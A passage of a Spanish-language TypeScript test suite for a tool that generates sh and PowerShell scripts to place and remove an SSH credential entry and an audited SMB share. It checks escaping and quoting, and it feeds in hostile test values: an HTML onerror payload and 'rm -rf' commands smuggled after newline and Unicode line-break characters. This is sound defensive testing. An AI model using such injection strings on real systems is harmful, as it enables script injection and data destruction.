			'contraseña sdpruebaabcd1234.'
		);
		expect(texto(exportar(windows, 'md').contenido)).toContain(
			"```powershell\n$sd = @{\n  'destino_nombre' = 'fs01'"
		);
	});

	it('el .md escapa lo que daría formato y ningún valor sale de su bloque de código', () => {
		const c = contexto({
			trampa: {
				id: 'ssh-fs01',
				nombre: '*negrita* <img src=x onerror=alert(1)> [a](http://x) `c` # t'
			}
		});
		const p = generar(credencial, 'linux', { ...deCredencial(), sesion: 'a```b' }, c);
		const t = texto(exportar(p, 'md').contenido);
		expect(t).toContain(
			'# Pasos de «\\*negrita\\* \\<img src=x onerror=alert(1)\\> \\[a\\](http://x) \\`c\\` \\# t» en fs01'
		);
		expect(t).not.toMatch(/(?<!\\)<img/);
		/* El bloque de variables lleva una valla más larga que cualquier tira de ` del valor. */
		expect(t).toContain("````sh\nSD_DESTINO_NOMBRE='fs01'");
		expect(t).toContain("SD_SESION='a```b'\n");
	});

	it('el .txt, lo mismo sin formato', () => {
		const t = texto(exportar(linux, 'txt').contenido);
		expect(t).not.toContain('```');
		expect(t).not.toContain('**');
		for (const parte of [
			'Pasos de «Credencial de fs01» en fs01\n=====================================\n',
			`sha256 de los pasos: ${linux.sha256}`,
			"    SD_USUARIO='svc_sql4k7'",
			'QUÉ SE VA A HACER',
			'    mkdir -p "$HOME/.ssh"',
			'CÓMO SE COMPRUEBA',
			'CÓMO SE RETIRA',
			'1. Borra la conexión «nas42» de ~/.ssh/config.'
		])
			expect(t, parte).toContain(parte);
	});

	it('un salto de línea en lo guardado se queda dentro del comentario: nunca pasa a código', () => {
		/* PowerShell termina una línea también en un \r suelto; sh, solo en \n. */
		const tocado = structuredClone(linux) as Datos;
		tocado.nombres.trampa = 'x\nrm -rf a\rrm -rf b\r\nrm -rf c\u2028rm -rf d\u0085rm -rf e';
		for (const [formato, lenguaje, salto] of [
			['sh', 'sh', /\n/],
			['ps1', 'powershell', /\r\n|\r|\n/]
		] as const) {
			const p = { ...tocado, lenguaje };
			p.sha256 = sha256Pasos(p);
			const lineas = texto(exportar(p, formato).contenido).split(salto);
			const conRm = lineas.filter((l) => l.includes('rm -rf'));
			expect(conRm.length, formato).toBeGreaterThanOrEqual(2);
			for (const l of conRm) expect(l.startsWith('# '), `${formato}: ${l}`).toBe(true);
		}
	});
});

it('literales: comillas simples, con la comilla escapada como cada lenguaje lo pide', () => {
	expect(literalSh("a'b")).toBe(`'a'\\''b'`);
	expect(literalSh('$(x) `y` "z" \\')).toBe(`'$(x) \`y\` "z" \\'`);
	expect(literalPowershell("a'b")).toBe("'a''b'");
	expect(literalPowershell('‘’‚‛')).toBe("'‘‘’’‚‚‛‛'");
	expect(literalPowershell('$(x) "y" `z')).toBe(`'$(x) "y" \`z'`);
});

describe.each([
	['sh', ['sh']],
	['dash', ['dash']],
	['busybox sh', ['busybox', 'sh']]
] as const)('el .sh, ejecutado con %s', (nombre, orden) => {
	const esta = hay(orden[0]);
	if (!esta) {
		it.skip(`${nombre} no está en el PATH: se salta`, () => {});
		return;
	}

	it('imprime los valores hostiles tal cual y no ejecuta nada de ellos', () => {
		const { p, salida } = hostiles('sh');
		const r = ejecutar([...orden], exportar(p, 'sh'));
		expect(r.error).toBe('');
		expect(r.codigo).toBe(0);
		expect(r.salida).toBe(salida);
		expect(existsSync(join(r.dir, 'PWNED'))).toBe(false);
	});

	it('una orden que falla para el script y dice en qué paso', () => {
		const r = ejecutar([...orden], exportar(dosPasos('sh', 'orden'), 'sh'));
		expect(r.codigo).not.toBe(0);
		expect(r.error).toContain('Sugardaddy: ha fallado el paso 1 de 2.');
		expect(r.salida).toContain("Paso 1 de 2: Primero, con uno 'dos'.");
		expect(r.salida).not.toContain('segundo-hecho');
	});

	it('una comprobación que no termina bien para con el texto del paso', () => {
		const r = ejecutar([...orden], exportar(dosPasos('sh', 'comprobar'), 'sh'));
		expect(r.codigo).toBe(1);
		expect(r.error).toBe("Sugardaddy: no se cumple el paso 1 de 2: Primero, con uno 'dos'.\n");
		expect(r.salida).not.toContain('segundo-hecho');
		const bien = ejecutar([...orden], exportar(dosPasos('sh', 'vale'), 'sh'));
		expect([bien.codigo, bien.error]).toEqual([0, '']);
		expect(bien.salida).toContain('segundo-hecho\n');
	});

	it('credencial-ssh en Linux: pone la conexión, se puede repetir y retirar deja ~/.ssh/config como estaba', () => {
		const p = generar(credencial, 'linux', deCredencial());
		const dir = carpeta();
		const config = join(dir, '.ssh', 'config');
		const antes = 'Host otro\n  HostName 192.0.2.7\n  User yo\n';
		spawnSync('sh', [
			'-c',
			`mkdir -p "$1/.ssh" && printf '%s' "$2" > "$1/.ssh/config"`,
			'sh',
			dir,
			antes
		]);
		for (let vez = 0; vez < 2; vez++) {
			const r = ejecutar([...orden], exportar(p, 'sh'), dir);
			expect(r.error).toBe('');
			expect(r.codigo).toBe(0);
			expect(readFileSync(config, 'utf8')).toBe(
				`${antes}Host nas42\n  HostName 10.20.0.5\n  User svc_sql4k7\n  Port 2222\n`
			);
		}
		const r = ejecutar([...orden], exportar(p, 'sh', { parte: 'retirar' }), dir);
		expect(r.codigo).toBe(0);
		expect(readFileSync(config, 'utf8')).toBe(antes);
	});

	it('acepta la sintaxis de todos los scripts de credencial-ssh', () => {
		const p = generar(credencial, 'linux', deCredencial());
		for (const f of [
			exportar(p, 'sh'),
			exportar(p, 'sh', { parte: 'retirar' }),
			exportar(p, 'sh', { parte: 'probar', nonce: 'abcd1234' })
		]) {
			const dir = carpeta();
			writeFileSync(join(dir, f.nombre), f.contenido);
			const r = spawnSync(orden[0], [...orden.slice(1), '-n', join(dir, f.nombre)], {
				cwd: dir,
				encoding: 'utf8'
			});
			expect(r.stderr, f.nombre).toBe('');
			expect(r.status, f.nombre).toBe(0);
		}
	});
});

describe('el .ps1, ejecutado con pwsh', () => {
	const pwsh = ['pwsh', 'pwsh-preview'].find(hay);
	if (!pwsh) {
		it.skip('pwsh no está en el PATH: se saltan las pruebas que ejecutan el .ps1', () => {});
		return;
	}
	const orden = [pwsh, '-NoProfile', '-NonInteractive', '-File'];

	it(
		'imprime los valores hostiles tal cual y no ejecuta nada de ellos',
		{ timeout: 60_000 },
		() => {
			const { p, salida } = hostiles('powershell');
			const r = ejecutar(orden, exportar(p, 'ps1'));
			expect(r.error).toBe('');
			expect(r.codigo).toBe(0);
			expect(r.salida.replace(/\r\n/g, '\n')).toBe(salida);
			expect(existsSync(join(r.dir, 'PWNED'))).toBe(false);
		}
	);

	it('una orden que falla para el script y dice en qué paso', { timeout: 60_000 }, () => {
		const r = ejecutar(orden, exportar(dosPasos('powershell', 'orden'), 'ps1'));
		expect(r.codigo).not.toBe(0);
		expect(r.error).toContain('Sugardaddy: ha fallado el paso 1 de 2: ');
		expect(r.salida).not.toContain('segundo-hecho');
	});

	it('una comprobación que no da True para con el texto del paso', { timeout: 60_000 }, () => {
		const r = ejecutar(orden, exportar(dosPasos('powershell', 'comprobar'), 'ps1'));
		expect(r.codigo).not.toBe(0);
		expect(r.error).toContain("Sugardaddy: no se cumple el paso 1 de 2: Primero, con uno 'dos'.");
		expect(r.salida).not.toContain('segundo-hecho');
		const bien = ejecutar(orden, exportar(dosPasos('powershell', 'vale'), 'ps1'));
		expect([bien.codigo, bien.error]).toEqual([0, '']);
		expect(bien.salida).toContain('segundo-hecho');
	});

	it(
		'smb.v2 en Windows, con SMB simulado: colocar no hace suyo nada que ya hubiera y retirar solo quita lo que puso',
		{ timeout: 60_000 },
		() => {
			const dir = carpeta();
			/* La ruta de verdad es de Windows (C:\…); aquí, una de la carpeta de la prueba. */
			const ruta = join(dir, 'Nominas');
			const lit = literalPowershell;
			/* Los scripts de colocar y de retirar para una ruta. */
			const scripts = (r: string, nombre: string) => {
				const p = generar(smb, 'carpeta-auditada', { recurso: 'Nominas', ruta: r }, contexto());
				const colocar = join(dir, `${nombre}-colocar.ps1`);
				const retirar = join(dir, `${nombre}-retirar.ps1`);
				writeFileSync(colocar, exportar(p, 'ps1').contenido);
				writeFileSync(retirar, exportar(p, 'ps1', { parte: 'retirar' }).contenido);
				return { colocar: lit(colocar), retirar: lit(retirar) };
			};
			const s = scripts(ruta, 'a');
			const sinPadre = join(dir, 'no-existe', 'Nominas');
			const sp = scripts(sinPadre, 'b');
			const r = lit(ruta);
			const fichero = lit(join(ruta, 'mio.txt'));
			/*
			 * Get-SmbShare, New-SmbShare y Remove-SmbShare sobre una tabla (New-SmbShare
			 * falla con $global:fallar); auditpol, con la auditoría activada. Estado: si
			 * existe la carpeta y a dónde apunta el recurso Nominas.
			 */
			const script = `
$env:TEMP = ${lit(dir)}
$global:recursos = @{}
$global:fallar = $false
function Get-SmbShare { [CmdletBinding()] param([string]$Name) if ($global:recursos.ContainsKey($Name)) { [pscustomobject]@{ Name = $Name; Path = $global:recursos[$Name] } } }
function New-SmbShare { [CmdletBinding()] param([string]$Name, [string]$Path, [string[]]$ReadAccess) if ($global:fallar) { throw 'sin permiso' } $global:recursos[$Name] = $Path }
function Remove-SmbShare { [CmdletBinding()] param([string]$Name, [switch]$Force) $global:recursos.Remove($Name) }
function auditpol { $f = ($args | Where-Object { $_ -like '/file:*' }) -replace '^/file:', ''; Set-Content -LiteralPath $f -Value @('Subcategory GUID,Setting Value', '{0CCE9244-69AE-11D9-BED3-505054503030},1') }
function Ejecutar([string]$f) { try { & $f *> $null; 'bien' } catch { 'para' } }
function Estado { $d = if ($global:recursos.ContainsKey('Nominas')) { if ($global:recursos['Nominas'] -eq ${r}) { 'aqui' } else { $global:recursos['Nominas'] } } else { 'nada' }; "$(Test-Path -LiteralPath ${r}) $d" }
function Limpiar { $global:recursos.Clear(); if (Test-Path -LiteralPath ${r}) { Remove-Item -LiteralPath ${r} -Recurse -Force } }
$x = @()
$x += Ejecutar ${s.colocar}; $x += Estado
$x += Ejecutar ${s.colocar}; $x += Estado
$x += Ejecutar ${s.retirar}; $x += Estado
$x += Ejecutar ${s.retirar}; $x += Estado
New-Item -ItemType Directory -Path ${r} | Out-Null
Set-Content -LiteralPath ${fichero} -Value 'mío'
$x += Ejecutar ${s.colocar}; $x += Ejecutar ${s.retirar}; $x += "$(Test-Path -LiteralPath ${fichero}) $($global:recursos.Count)"
Limpiar
New-Item -ItemType Directory -Path ${r} | Out-Null
$x += Ejecutar ${s.colocar}; $x += Ejecutar ${s.retirar}; $x += Estado
Limpiar
New-Item -ItemType Directory -Path ${r} | Out-Null
Set-Content -LiteralPath ${fichero} -Value 'mío'
$global:recursos['Nominas'] = ${r}
$x += Ejecutar ${s.colocar}; $x += Ejecutar ${s.retirar}; $x += "$(Test-Path -LiteralPath ${fichero}) $(Estado)"
Limpiar
$global:recursos['Nominas'] = 'otra-carpeta'
$x += Ejecutar ${s.colocar}; $x += Ejecutar ${s.retirar}; $x += Estado
Limpiar
$x += Ejecutar ${sp.colocar}; $x += "$(Test-Path -LiteralPath ${lit(sinPadre)}) $($global:recursos.Count)"
$global:fallar = $true
$x += Ejecutar ${s.colocar}; $x += Estado
$x -join '|'
`;
			const a = spawnSync(pwsh, ['-NoProfile', '-NonInteractive', '-Command', script], {
				cwd: dir,
				encoding: 'utf8',
				timeout: 60_000
			});
			expect(a.stderr).toBe('');
			expect(a.stdout.trim().split('|')).toEqual([
				/* Coloca: crea la carpeta y el recurso apunta a ella. */
				'bien',
				'True aqui',
				/* Volver a colocar para con su mensaje y no cambia nada. */
				'para',
				'True aqui',
				/* Retirar quita el recurso y la carpeta, y se puede repetir. */
				'bien',
				'False nada',
				'bien',
				'False nada',
				/* Una carpeta del cliente con algo: no coloca, y retirar no la toca. */
				'para',
				'bien',
				'True 0',
				/* Una carpeta del cliente vacía: no coloca, y retirar sin haber colocado no la borra. */
				'para',
				'bien',
				'True nada',
				/* El recurso del cliente con ese nombre y en esa carpeta: no coloca, y retirar para sin tocarlo. */
				'para',
				'para',
				'True True aqui',
				/* Un recurso con ese nombre en otra carpeta: no coloca, y retirar no lo quita. */
				'para',
				'bien',
				'False otra-carpeta',
				/* Sin la carpeta de encima: no crea ninguna. */
				'para',
				'False 0',
				/* Si no se puede compartir, no deja la carpeta que acaba de crear. */
				'para',
				'False nada'
			]);
		}
	);

	it(
		'el analizador de PowerShell acepta todos los .ps1 de los ejemplos',
		{ timeout: 60_000 },
		() => {
			const windows = generar(credencial, 'windows', deCredencial());
			const r = validarParametros(smb.parametros, { ruta: RUTA_SMB });
			if (!r.ok) throw new Error(r.errores.join());
			const carpetaAuditada = generar(smb, 'carpeta-auditada', r.valor);
			const dir = carpeta();
			const ficheros = [
				exportar(windows, 'ps1'),
				exportar(windows, 'ps1', { parte: 'retirar' }),
				exportar(windows, 'ps1', { parte: 'probar', nonce: 'abcd1234' }),
				exportar(carpetaAuditada, 'ps1'),
				exportar(carpetaAuditada, 'ps1', { parte: 'retirar' })
			].map((f, i) => {
				const ruta = join(dir, `${i}-${f.nombre}`);
				writeFileSync(ruta, f.contenido);
				return ruta;
			});
			const script = ficheros
				.map(
					(f) =>
						`$t = $null; $e = $null; [void][System.Management.Automation.Language.Parser]::ParseFile(${literalPowershell(f)}, [ref]$t, [ref]$e); $e | ForEach-Object { ${literalPowershell(f)} + ': ' + $_.Message }`
				)
				.join('\n');
			const a = spawnSync(pwsh, ['-NoProfile', '-NonInteractive', '-Command', script], {
				encoding: 'utf8',
				timeout: 60_000
			});
			expect(a.stderr).toBe('');
			expect(a.stdout).toBe('');
			expect(a.status).toBe(0);
		}
	);
});
